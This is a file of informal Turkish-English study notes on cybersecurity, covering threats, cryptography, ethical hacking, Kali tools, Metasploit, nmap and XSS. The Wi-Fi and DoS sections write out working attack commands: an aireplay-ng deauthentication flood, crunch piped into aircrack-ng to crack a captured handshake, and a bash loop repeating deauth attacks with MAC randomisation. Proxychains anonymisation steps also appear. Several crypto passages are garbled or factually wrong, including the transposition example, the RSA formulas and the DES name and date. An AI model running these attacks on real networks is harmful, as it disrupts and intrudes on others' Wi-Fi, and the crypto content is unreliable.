@@ -1,0 +1,979 @@
+====CYBER THREATS (SİBER TEHİDTLER)====
+
+1 MALWARE = ZARARLI YAZILIMLAR ÖRN WORM TROJAN VS
+2 PHİSHİNG = OLTALAMA TAKTİĞİ 
+3 PASSWORD ATTACKS = ŞİFRE DENEME ATAKALRI
+4 DDOS = HİZMET AKSAMA ATAĞI 
+5 MAN İN THE MİDDLE = ORTADAKİ ADAM 
+6 DRİVE-BY DOWNLOADS = SİTE ZİYARETLERİNDE OTOMATİK YÜKLENEN YAZILIMLAR
+7 MALADVERTİSİNG = KÖTÜ AMAÇLI REKLAM
+8 ROGUE SOFTWARE = SAHTE GÜVENLİK YAZILIMLARI
+===============================
+SALDIRGAN NELER YAPAR
+
+Unauthorised Modificaation = YETKİSİZ DÜZENLEME
+Unauthorison Deletion = YETKİSİZ SİLME
+Unauthorised Accsess = YETKİSİZ ERİŞİM
+===============================
+Steps to Fix a Crime (SALDIRGANIN YAPTIKLARINI DÜZELTME)
+
+confidentiality = gizlilik
+Analyse = ANALİZ
+ıdentify = tanımlamak
+treat = tedavi etmek
+====================================
+Vulnerability Threat & Risk (GÜVENLİK AÇIĞINI TEHDİT VE RİSK)
+
+1.Vulnerability 
+Güvenlik açığı bir veya daha fazla saldırgan tarafından kulanılabilcek bir varlığın zayıflığına ifade eder
+
+Sİber dünya savunmasızlığı bağlamında donanım veya yazılımdaki bir hata/ kusur, düzeltmeye devam eden ve CIA triadının unsurlarından 
+birine zarar vermek için sömürlmeye eğilmli olan bir hata / kusur anlamına gelir
+
+2.Threat (TEHİDT)
+Bir tehdit bir organizasyona veya bireye zarar verme potansiyeline sahip herhangi bir olaydır
+
+Doğal tehditler kasıtlı tehditler kasıtlı tehditler
+
+Theditleri anlamak için tehdit değerlendirme teknikleri kullanılır
+
+3.RISK
+Risk, bir tehdit bir güvenlik açığından yaralandığında potansiyel kayıp veya hasar anlamına gelir
+
+RİSK = TEHDİT X GÜVENLİK AÇIĞI 
+
+Siber güvenlik için risk anahtar yönetimi
+=========================================
+
+
+
+
+==========CYBER SECRUİTY AND CRYPTOGRAPHY (SİBER GÜVENLİK VE KRİPTOLOJİ)=================
+                    
+                               CRYPTOGRAPHY 
+                               |                     |
+                               |                     |
+                               |                     |
+                               |                     |
+      Symmetric key                           Asymmetric key 
+      Simetrik anahtar                         Asimetrik anahtar
+              |
+              |
+              |________________________________________
+              |                                                           |
+            Classical                                                  Modern
+           |            |                                                |            |
+           |            |                                                |            |
+           |            |                                                |            |
+  Transpositon    Substitution                           Stream     Block
+  Cipher                chiper                                 chiper      chiper
+ 
+ Stream chiper = Akış çipi
+ Block chiper = Block çipi
+
+ 
+🔑️Symmetric key 
+Bir iletinin göndereni ve alıcısının, iletiyi şifrelemek ve şifresini çözmek için kullanılan tek bir ortak anahtarı paylaştığı bir şifreleme
+sistemi ..... En popüler simetrik anahtar sistemi veri şifreleme standardıdır (DES DATA ENCRYPATİON STANDARD)
+
+
+                                              🔑️
+                  __ ____________same key________________
+                 |                                                           |                    
+                 |                                                           |
+  Scret key 🔑️                                                       🔑️ Screy key
+                 |                                                           |
+                 |                       _____________                 |
+📃️=> Sign(Encrypt)===>|D654dfjgdk|====>(Decrypt)=>📃️
+plain txt                             chiper txt                                plain txt
+
+
+
+
+🔑️Transposition Chiper
+Kriptografide transpoziyson çipleri düz metin birimleri (genelikle karekterler veya karekter grupları olan) tarafından
+tutulan konumun normal bir sisteme göre kaydırıldığı bir şifreleme yöntemidir. böylece çip metni düz metnin bir permütasyonunun oluşturur
+
+
+
+| 1 | 2 | 3 | 4 | 5 | 6 |          | 6 | 5 | 4 | 3 | 2 | 1 |          
+| M | E | E| T | M | E |          | T | E | M | E |  E | M|
+| A | F | T | E | R |  P |         | E |  F | A | P |  T |  R|
+| A | R | T | Y |    |     |         | Y |  R | A |   |  T  |    |
+|    |    |    |    |   |     |          |    |    |    |   |      |    | 
+
+
+Plain text (Düz metin): MEET ME AFTER PARTY
+KEY USED: 421635
+Chiper text (Şifreli metin): TEMEEEMEFAPTRYRAT
+
+
+
+
+🔑️Substitution Chiper (Sezar şifresi)
+Düz metin birimlerinin sabit bir sisteme göre chipertext ile değiştirildiği şifreleme yöntemi “birimler” tek harfli (en yaygın) harfler üç 
+harfli harfler yukardakilerin karşımıları vb olabilir
+
+Plaintext Alphabet (Düz metin alfabesi) :ABCDEFGHIJKLMNOPQRSTUVWXYZ
+keyword: Zebras
+chipertext Alphabet:  ZEBRASCDFGIJKLMNOPQTUVWXY
+
+MESAJI: Filo hemen keşfedildik Enchipers için: SIAA ZQ LKBA. VA ZOA RFPBLUAOAR!
+                                                                      SIAAZ QLKBA VAZOA RFPBL UAOAR
+                                                                      
+
+
+
+🔑️Stream chiper                                                                      
+Bir akış yongası ile bir seferde tek bir biti şifreleyensimetrik veya screet-key şifreleme algoritması aynı  düz metin biti veya bayt her
+şifrelendiğinde farklı bit bit veya bayt şifrelenir
+
+
+
+
+                         Key                                                                                 key 
+                          K                                                                                     K
+                          |                                                                                      |
+                          |                                                                                      |
+                          |                                                                                      |
+                          |                                                                                      |
+                Pseudoradom byte                                                           Pseudoradom byte
+                      generator                                                                         generator
+               (key stream generator)                                                     (key stream generator)
+                          |                                                                                      |
+                          |                                                                                      |
+                          |                                                                                      |
+                          |                                                                                      |
+       Plain            |                                                                                      |                  Plain
+byte stream===+================ chipertext ===========+====== byte stream
+        M          Encryption                                byte stream                       Decryption          M
+        
+        
+ 
+ 
+ 
+        
+🔑️Block Chiper
+Akış yongalarında olduğu gibi bir seferde bir bit şifrelemek yerine bir metin bloğunun şifrelemek için simetrik bir anahtarla birlikte deterministik bir
+algoritma  uygulayan bir şifreleme yöntemi 
+
+
+                 📃️                                     D4584
+                  |                                       DAD87
+🔑️key=Block chiper                                |
+             Encryption               🔑️key=Block chiper
+                  |                                       Decyrption           
+                  |                                           |
+              D98798                                    |  
+              DAD8A7                                  📃️
+              
+GÜVENİLMEZ OLDUĞU SÖYLENİYOR BAZI KAYNAKLARDA              
+              
+
+
+
+              
+🔑️RSA
+ÇOK KULLANILAN BİR ŞİFRELEME SİSTEMİDİR
+
+Formüler
+p ve q aralırnda asal sayı seçicez 
+n = p . q
+& = (p-1) . (q-1)
+1 < e < p      (e ve & aralarında asaldır)
+d.e = 1 mod (&)
+	
+şifrelimetin      (ŞM) = (ş.m) = (d.m)e (modn)
+deşifreli metin (DM) =  (d.m) = (ş.m)d (modn)
+
+
+
+
+
+
+================== CYBER THREARTS (SİBER TEHDİTLER) =====================================
+
+SİBER ATAK TİPLERİ 
+
+1 MALWARE = ZARARLI YAZILIM 
+2 PHİSİNG = OLTLAMA TAKTİĞİ
+3 PASSWORD ATTACK = ŞİFRE ATAKLARI 
+4  DDOS = HİZMET AKSATMA SALDIRISI
+5 MAN İN THE MİDDLE = ORTADAKİ ADAM 
+6 DRİVE-BY DOWNLOAD = YETKİSİZ İNDİRME
+7 MALVERTİSİNG = ADS KÖTÜ REKLAMLAR 
+7 ROGUE SOFTWARE = SAHTE GÜVENLİK YAZILIM  
+
+
+1 MALWARE 
+
+Computer virus 
+Spyware
+Worms
+Adware
+Trojan Horse
+
+Email Attachments (Email ataçlarından)
+Software downloads (internet indirmelerli)
+OS vulnerability (OS Güvenlik açıkları)
+
+
+
+Stop Malware (Zararlı Yazılımı Durdurma)
+
+
+1.Suspicious Links (Şüpheli Linkler)
+
+Şüpheli linklere Tıklama
+
+Her zaman Url yi dikkatli bir şekilde inceleyin ve sahte bir sitede olmadığınızdan emin olun 
+
+
+2.Updated Firewall (Güvenlik Duvarını güncele)
+
+Güvenilk duvarınızı sürekli güncelemek harika bir fikirdir
+
+Güvenilk duvarları kötü amaçlı yazılım içerebilecek ekleri ayıklamak için büyük veri dosyalarını 
+ağ üzerinden aktarılmasını önler
+
+
+3.Updated OS
+
+Her zaman işletim sistemini ve güvenlik yamalarının güncele
+
+Sowtfare programcıları herhangi bir güvenlik açığını ele almak programları için sık sık günceller
+
+
+
+2 PHİSHİNG (OLTALAMA)
+
+Son 3 yılda finansal kurumlara yapılan saldırıların çoğu güvenllik duvarı cihazlarına yapılan kaba kuvvet saldırılarından KAYNAKLI
+
+What is phising used for (Oltalama saldırısı nasıl oluyor)
+
+1 Stealing confidential data (Gizli verileri çalmak)
+2 Harvesting login credential (Otrum açma kimlik bilgilerinin toplama)
+3 Impersontaing (Bürünme taktiği)
+
+
+Phishing awareness (Kimlik Avı farkındalığı)
+
+1Email gönderen kişiye dikkat edin7
+
+2Geneleşitirilmiş addrese dikkat edin
+
+3Size gönderilen linkin nereye gitiğine dikkat edin
+ 
+ 
+3 PASSWORD ATTACKS (ŞİFRE ATAKLARI)
+
+Saldırgan ele geçirdiği paroları kırıp sisteme sızmaya çalışır
+
+Types of Password Attacks (ŞİFRE ATAK TÜRLERİ)
+
+1 Brute force attacks
+2 Dictonary attacks
+3 Keylogger Attacks
+
+
+Stop Password Attacks (Şifreli Ataklardan kurtulma)
+
+1.Updated Password 
+
+Her zaman şifrelerini Güncele
+
+Her yerde aynı şifreyi kulanma
+
+
+2.Use Alpha-Numeric 
+
+Şifrelerinde her zaman karışık olsun
+
+Sembolik işaretlerle şifreyi zorlaştır
+
+
+3.No Dictonary
+
+Sözlük tabanlı kısa şifre kullanma 
+
+
+
+4 DDOS Attacks Distributed Denial of Service (Hizmet Aksatma atakları)
+
+Bir ağı hizmet kesintisine uğratmaya çalışır
+
+Prevention (Önlem)
+
+1 Traffic Analysis (Trafik Analizi)
+2 Traffic Control (Trafik Kontrolü)
+3 Recovery Management (Kurtarma yönetimi)
+
+
+5 MAN İN THE MİDDLE (ORTADAKİ ADAM)
+
+Kimiliğe bürünme taktiği
+
+
+
+                                 🕵️
+      ___________Man in the Middle______________
+      |                                                              |                   
+      |                                                              |
+      |                                                              |
+  Le you======================BANK 
+  (SEN)                                                       (BANKA)
+
+
+
+Prevent MITM (MITM Önlemi)
+
+1 Her zaman sitenin HTTP/HTTPS Olduğunu kontrol edin
+
+2 Halka açık yerlerde VPN kullanın
+
+3 Encrypted Wap Şifreli bir ağ kulanın
+
+
+
+6 DRİVE-BY DOWNLOADS 
+
+Genelikle size güvenlik yaması veya indirme sunan zaralı kod çalıştrmayaı isteyen işlem
+
+Prevent (Önlem)
+
+Güvenlk duvarınızı güncel tutun
+
+
+
+7 MALVERTİSİNG (Kötü amaçlı reklamlar)
+
+Kötü amaçlı reklamlar saldırganalar tarafından yerleştirilir 
+
+
+Prevention (Önlem)
+
+1 Adblocker (Reklam önleyici)
+
+2 Regular software Updates (Her zaman tarayıcını güncele)
+
+3 Common Sense (Sağ duyulu ol)
+
+
+
+Rogue Sowftware (Sahte Güvenlik yazılımları )
+
+Genelikle tehdit altında gibi gösterip size uygulama indirtmeye çalışır. Fidye yazılımlı program yükletmeye çalışır
+
+
+Prevention (Önlem)
+
+1 Updated Firewall (Güvenlik Duvarını güncele)
+2 Use Effcient Antivirus ( Antivirüs programı kulan)
+3 Genaral Distrut (Genel Güvensizilik)
+
+
+
+================ HİSTORY OF ETHİCAL HACKİNG (ETİK HACKER GEÇMİŞİ) ===========================================
+
+The Frist Computer  Worm (İlk Bilgisayar solucanı)
+
+Robert Tappan Morris Amerikalı bir bilgisayar bilimcisi ve girişmcidir ve 1988 de Morris Solucanının çevrimci olarak ilk bilgisayar Solucanı olarak kabul ettiği için bilinir
+Yaptığı solucan çok büyük etkiki oldu 
+
+
+
+Skills Necessary (Gerekli Beceriler)
+
+
+Computing (Bilgisayar)
+
+1.İşletim sistemlerin temel anlayışı
+
+2.Temel sowfware sistemlerinin alaşılması
+
+3.CLI (command line interface) komutunu kavramak
+
+
+Networking (İnterneti)
+
+1.Kablo.Sistem,Anahtar
+
+2.Networking Architecture (ağ mimarisi)
+
+3.Ağ protokülerinden anlama 
+
+
+Live Skills (Yaşam Becerisi)
+
+1.Kutunun dışında düşünme yeteneği
+
+2.Başarısızlıkarını kabul emte ve yola devam etme yeteneği
+
+3.Preseverance (AZİM)
+ 
+ 
+ Tools (Araçlar)
+ 
+ 1.Araçları kulanmayı öğrenmek
+ 
+ 2.İnterentağı
+ 
+ 3.Güvenlik
+
+
+Networking
+
+1.Paket kavramlarını öğrenmek
+
+2.TCP/IP öğrenmek
+
+3.Protokölerin neler yaptığını anlamalısın
+
+
+Meyhods 
+
+1.Toplanan bilgiler nasıl kullanılır
+
+2.Kaynaklarınızdan en iyi şekilde yararlanmak
+
+
+
+Arabellek aşımı (Buffer overflow)
+
+iki yazılım arasında veri iletişimi için ayrılmış olan bir arabelleğe boyutundan daha fazla veri koyulması ile ortaya çıkan durumdur
+
+bir arabellek taşımasını istismar etmek bilinenbir saldırıdır
+
+Ünlü morris solucanı saldırı tekniklerinden biridir
+
+
+Denial of Service (Hizmet Reddi)
+
+Botnet ile DOS yapılabilir
+
+ 
+Tribe Floof Network
+  
+TFN,ICMP sel SYN sel UDP sel ve Şirin saldırısı gibi çeşitli DDos saldırıları gerçekleştirmek için bilgisayar programları kümesidir
+
+
+
+Nedir Penetration Testi
+
+Güvelik açığı uzmanı 
+ 
+ Golas(Hedefler)
+ 
+ 1.Bİr kuruluşun güvenlik duruşundaki zayıflığın değerlendirmesi
+ 
+ 2.Risk pozisyonlarını daha iyi anlamak
+ 
+ 3.Dış istismarlardan önce zayıf noktaları bulmak için sistemlere erişme
+
+ 
+ Results (Sonuçlar)
+ 
+ 1.Detaylı bir rapor hazırlarsın
+ 
+ 2.Sistemde bulunan hataları düzeltirsin
+ 
+ 
+ SNMP (Simple Network Managemnet Protocol)
+             BASİT      AĞ      YÖNETİMİ    PROTOKÖLÜ
+             
+
+Wayback Machine - Archive.org 
+
+Site,Dosya gibi geniş kapsamlı dosyaların bulunduğu bir site
+
+
+Netcraft 
+
+Şirket güvenlik şirekti
+
+LİNUX ARAMA 
+
+whois <DNS> SİTE HAKKINDA TÜM BİLGİLERİ VERİR
+
+dig <DNS> Alt ip addreslerini verir subdomain
+
+DNS (DOMAİN NAME SERVİCES)
+
+
+GOOGLE HACKİNG
+
+“index of.” = her şeyi indexler
+
+filetype:config = Dosyaları listeler
+
+filetpye: doc = dosyaları listeler
+
+inurl: hack = daha iyi arama sunar
+
+GOOGLE HACKİNG DATA BASE 
+
+EXPLOİT DATABASE DİYER ADIYLA GOOGLE DORK
+
+
+ 
+TCP/IP 
+
+OSI 
+
+OSI 7 katmandan oluşur
+
+Application 
+Presentation
+Session
+Transport
+Network
+Datalink
+Physical
+
+
+TCP
+
+4 katmandan oluşur
+
+Application
+Transport
+Internet
+Link
+
+
+UDP USER DATA PROTOCOL 
+
+udp güvensiz hızlı bir protokol genelikle medya ses alnında kulanılır
+
+
+Src = source = KAYNAK 
+
+Dst = Destination = HEDEF
+
+Unicast = Tek hedefe yönelik
+
+Multicast = Çoklu hedefe yayın
+
+
+
+WİRESHARK
+
+wireshark paket yakalam programı genelikle siber güvenlikçiler ve hackerlar kulanılır
+
+
+IDS (SALDIRI TESPİT SİSTEMİ)
+Intrusion Detection Systems 
+
+DHCP (Dynamic Host Configuration Protocol)= modemin size verdiği ip addres
+
+
+
+
+DES (Digital Encryption Standard) 
+
+ simetrik şifreleme algoritmasıdır. 1997'de resmi bilgi şifreleme  standardı olarak kabul edilirken,
+  2000'de yerini AES'e bırakmıştır. DES, gizli anahtarlı bir şifreleme türüdür, büyük boyutlu verilerin  şifrelenmesinde kullanılır.
+
+
+  
+  AES (Advance Encryption Standard) 
+  
+  AES, elektronik verinin şifrelenmesi için sunulan bir standarttır.  Amerikan hükûmeti tarafından kabul edilen AES, uluslararası alanda da  defacto şifreleme standardı olarak kullanılmaktadır. DES'in yerini  almıştır.
+  
+  
+  TÜM İŞLETİM SİSTEMLERİNDE KRİPTOLJİ BULUNUR
+  
+  cmd üzerinde 
+  
+  type  <text.txt> = txt oku içinde ne var 
+  
+  aescrypt    -e          -p pokemon text.txt
+  AES        encrypt    password      file
+  
+  dir ile listele 
+  
+  text.txt.aes    diye şifelenmiş
+  
+  aescrypt     -d        -p pokemon text.txt.aes    çözme işlemi 
+    AES      decrypt    password      file
+    
+
+
+
+LİNUX ÜZERİNDEN ŞİFRELEME 
+
+
+openssl genrsa -des3 -out private.key 4096
+
+özel anahtar oluşturdu
+
+openssl rsa -in private.key -pubout -out public.key
+
+açık anahtar oluşturuldu 
+
+openssl rsault -encrypt -pubin -inkey public.key -in text.txt -outh encrypted.txt
+
+dosya şifrelendi
+
+openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plainext.txt
+
+Şifreyi çözme
+
+sslscan <DNS> dinler
+
+
+
+HASH
+
+hasler geri dödürülemez 
+
+ama hash oluşturup eşleme yaparak bulunabilir 
+
+
+
+IDS ÇALIŞMA PRENSİBİ 
+
+
+
+
+                                                       IDS/IPS              _______Host-based IDS/IPS server
+                                                           |                    |               
+                                                           |                    |
+Untrust    _______________FİRE WALL___|_____Router__|_______Host-based IDS/IPS server
+(Güvensiz)                                                                |
+                                                                                |
+                                                                                |_______Host-based IDS/IPS server
+                                                                                
+
+Eyer herhangi bir anomali algılarsa devreye geçer
+
+                                                                                
+========== FUNDAMENTALS OF NETWORKİNG (AĞ TEMELİ)==========================                                                                                
+
+katoolin = Linux toolarını yüklemeye yardımcı olan bir git hub toolu 
+
+======== Ethical Hacking using Kali Linux (Etik hacker kali linux kullanımı)==================
+
+pwd = Nerde olduğunu listeler 
+
+cd = Dosyalar arası gezinti
+
+ls = 	Bulunduğun dizindeki dosyaları listeler
+
+cp = Dosya veya klasör kopyalar
+
+mv = dosya taşıma veye isim değişikliği yapar
+
+cat = bir dosyayı okumayı sağlar
+
+less = uzun metinleri okumayı sağlar
+
+grep = verdğiniz kelime ile tarama yapar
+
+echo = yankı 
+
+touch = dosya oluşturmaya yarar
+
+mkdir = klasör oluşturmaya yarar
+
+chown = dosya kulanıcı izinlerini değiştirir
+
+chmod = dosya izinlerini değiştirir
+
+rm = silmeye yarar
+
+man = bir uygulama hakkında bilgi verrir
+
+--help = uygulama parametlerini verir
+
+-v verbose(ayrıntılar) = Size komutun ne yaptığı hakkında ayrıntılı bilgi verir
+
+chown root:root file.txt   chown yetkili:grup file.txt
+
+
+Proxchain?
+
+proxychain anonimleşme harektini başlatır
+
+nano /etc/proxychains.conf
+
+dynamic_chain   “#” hasini kaldır
+
+strict_chain “#” hash koy
+
+en alta in ve socks5 127.0.0.1 9050 yaz 
+
+
+service tor start = tor servini başlatır
+
+proxychains firefox www.duckduckgo.com
+
+internete bedava proxy server list yazarak kulanabilrisin
+
+
+
+MACCHANGER (MAC DEĞİŞTİRİCİ)
+
+MAC addres (MEDİA ACCESS CONTROL) (MEDİYA ERİŞİM KONTROLÜ)
+
+FF:FF:FF:  FF:FF:FF
+     3             3  
+satıcı          Evrensel 
+unique       addres
+
+
+ARP (ADDRESS RESOLUTİON PROTOCOL)
+
+arp -a 
+
+Mac addresi fiziksel address tir
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.45  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::4c1:1f20:a7c4:e167  prefixlen 64  scopeid 0x20<link>
+        ether 80:c5:f2:d9:7d:f3  txqueuelen 1000  (Ethernet)
+        RX packets 3494671  bytes 4662221254 (4.3 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3095414  bytes 319588555 (304.7 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+SARI İLE GÖSTERİLEN BİZİM MACİMİZ 
+
+macchanger -s eth0 dersek bizim mac addressimizi verir
+
+macchanger --list = Sana mac addreslerini listeler
+
+macchanger -r eth0 = random mac addressi verir
+
+Crontab Linuxta görevleri yönetiyor
+
+
+/tmp/crontab.Ss564l/crontab içine gir
+
+veya 
+
+crontab -e = editör seç ve yaz
+
+en allta bilgisayar açıldığı an neler yapacağını yaz 
+
+@reboot macchanger -r eth0 = HER BİLGİSAYAR AÇILDIĞINDA MAC DEĞİŞECEK
+
+
+
+WIRELESS PENTESTING (WİRLES PENTESLİĞİ)
+
+crunch =  şifre oluşturur
+
+crunch 4 6 şifre = minimun uzunluk 4 maximun uzunluk 6 olan şifre kelimesinden worldlist oluşturma
+
+İWCONFİG = WİFİ KARTINDAN SORUMLU
+İFCONFİG = NETWORK DEN SORUMLU
+
+ifconfig wlan0 down = ağ kartını indirdik
+iwconfig wlan0 mode monitor = dinelme moduna sokuldu ağ kartı
+ifconfig wlan0 up = ağ kartı devrye girdi
+
+airmon-ng check wlan0 = Ağ kartında biri çalışıyormu 
+
+Çalışıyor ise 
+
+airmon-ng check kill = tüm çalışan prosesleri öldürür
+
+airodump-ng wlan0 = Ağı dinler
+
+ESSID = WİFİ HAKKINDA BİLGİLER VERİR ADI,KULANDĞI GÜVENLİĞİ
+
+CH = HANGİ KANALDA YAYIN YAPIYOR 
+
+BSSID = MODEMİN MAC ADDRESİ 
+
+ENC = ENCRYPİTON (ŞİFRELEME TÜRÜ) WPA/WPA2/WEP/WAP
+
+CIPHER = ŞİFRELEME SAYAÇI    CCMP Sayaç Modu Şifre Bloğu Zincirleme Mesajı Kimlik Doğrulama Kodu Protokolü 
+
+PSK = PRE-shared key
+Kriptografide,  önceden paylaşılan bir anahtar, kullanılmadan önce güvenli bir kanal  kullanarak iki taraf arasında daha önce paylaşılan paylaşılan bir  sırdır
+
+airodump-ng -c 11 -w /root/Desktop/test_capture -bssid 79:55:55:88:48 
+
+airmon-ng start wlan0 6 = 6 kanalda çalışsın
+
+aireplay-ng -0 0 -a bssid -c = DOS (DENİAL OF SERVİCES) ATAĞI BAŞLATIN
+
+crunch 12 12 -t azat@@@%%% qwertyuııopğüişlkjhgfdsazxcvbnmöç123456789 | aircrack-ng -w - capture-01.cap -e nestaway_C1rea
+
+ŞİFRE KIRLIMA BAŞLAR
+
+
+
+LİNUX DİSTRİBUTİONS FOR HACKİNG (LİNUX HACKER DAĞITIMLARI)
+
+POPULAR LİNUX DİSTRİBUTİONS 
+
+1 KALİ LİNUX
+2 BACKBOX
+3 DEFT
+4 PARROT SECRUİTY
+5 PENTOO
+6 CYBORG
+7 ARCHLİNUX
+8 PARDUS
+9 MAJORO
+
+
+PAROT OS Parot çekirdeğinde anonsurf diye bir uygulama var bu  uygulama proxychains kulanıp anonimlik sağlar
+
+
+
+======== PENETRATİON TESTİNG (SIZMA TESTİ)========================================
+
+
+what is vulnerability assessment(Güvenlik açığı değerlendirmesi nedir)
+
+
+1 Varlık yeteneklerini belirleme (Identify assets capabilites)
+
+2 Değerlendirmeyi nicelleştirin (Quantify the assessment)
+
+3 Sonuçları rapor et (Report the results)
+
+
+Metasploit = Metasploit penetrasyon testlerinde yaygın kullanılan en iyi araçtır
+
+Metasploit = Ruby ile yazılmıştır
+
+
+
+Metasploit ile penetration testis 
+
+Saldırı = PostgreSQL
+
+PostgreSQL = veri tabanı sistemdir Unıx de kullanılır
+
+
+service postgresql start = Veritabanı sistemi aktif
+
+msfconsole = Metasploit i başlatır
+
+help = yardımı görüntüler
+
+banner = afiş kullanabilirsin
+
+exploit = sömürü anlamına gelir 
+
+payloads = yük anlamına gelir bir sistemi hacklediğiniz zaman sonra neler yapılacağına karar verir
+
+show exploits = Tüm exploitleri gösterir
+
+search mysql = mysql hakkında tüm exploitleri getirir
+
+auxiliary = yardımcı destek 
+
+info axuiliary = axuiliary hakkında bilgi veriri
+
+use = ile komutu seçip kullanmaya başlarsınız
+
+show options = exploiti seçtikten sonra ayarlmaları gösterir
+
+set = exploitin ayarlaarını seçer örn   set  RHOST 198.168.1.1
+
+required = Grekekli YES yazarsa gerekli NO yazarsa gerekli değil 
+
+exploit = sömürüyü çalıştırır
+
+back = geri çıkar 
+
+run = exploiti çalıştırır
+
+=============NMAP (AĞ TARAMA)==========================
+
+NMAP = nmap ağ portlama işini yapar 
+
+nmap -F <DNS> = hızlı moda tarar 
+
+nmap --traceroute www.google.com = Paket yolunun takip eder 
+
+
+
+======== CSS-XXS (CROSS-SİTE SCRİPTİNG)=========================
+
+Bir site üzerinden komut çalıştırılabilir 
+
+XXS = ÜÇ ANA ŞEKİLDE LİSTELENMİŞTİR 
+
+1 Reflected XSS
+
+2 Stored XSS
+
+3 Dom XSS
+
+
+
+1 Reflected XSS (siteler arası komut dosyasyı olıuşturmayı sağlıyor)
+
+2 Stored XSS (Depolanmış veya kalıcı siteler arası komut çalıştırmaya yarar)
+
+3 Dom XSS (Dom tabanlı sitieler arası komut çalıştırmaya yarar)
+
+
+
+
+Repercussions of XSS (XSS  Yansımaları)
+
+Cookie veya çerez saldırgan bunları alırsa kimliğine bürünebilir
+
+Bir kullanıcın kamerasına veya mikrofonna erişileblir hata konumu bile alabilir
+
+ 
+ 
+ OWASP 
+ 
+ Açık Web Uygulaması Güvenlik Projesi web uygulması güvenliği alanında serbestçe erişilebilen
+ makaleler metodolojiler belgeler araçlar ve teknolojiler üreten çevrimçi bir topluluktur
+ 
+ DEMO XSS
+ 
+ <script>alert('hello man')</script>
+ 
+ 
+ ======= DDOS ATTACK (DİSTRİBUTED DENİAL OF SERVİCE )===================
+
+ 
+ Types of Dos Attack (DOS atak tipleri)
+ 
+1 Ping of deaht (ölüm pingi) 
+Maksimun paketlerinden daha büyük paketler gönderiri
+
+2 Reflected Attacks (yansıma atağı)
+botnet saldırısı
+
+3 Mailbomb
+Genelikle e-posta sunuclarına saldırır
+
+4 Teardrop Attack
+
+
+DOS ÖRNEK 
+
+aireplay-ng -0 0 -a bssid -c mac wlan0
+
+
+Küçük Bash DOS ağ saldırısı
+
+while true
+do
+            aireplay-ng -0 10 -a <bssid> wlan0
+            ifconfig wlan0 down
+            macchanger -r wlan0 | grep New MAC
+            iwconfig wlan0 mode monitor
+            ifconfig wlan0 up
+            sleep 5
+done
+
+
+
+======== SQL Injection ===========================0
+
+SQL enjeksyon saldırsı bir tür siber güvenlik saldırısıdır
+
+
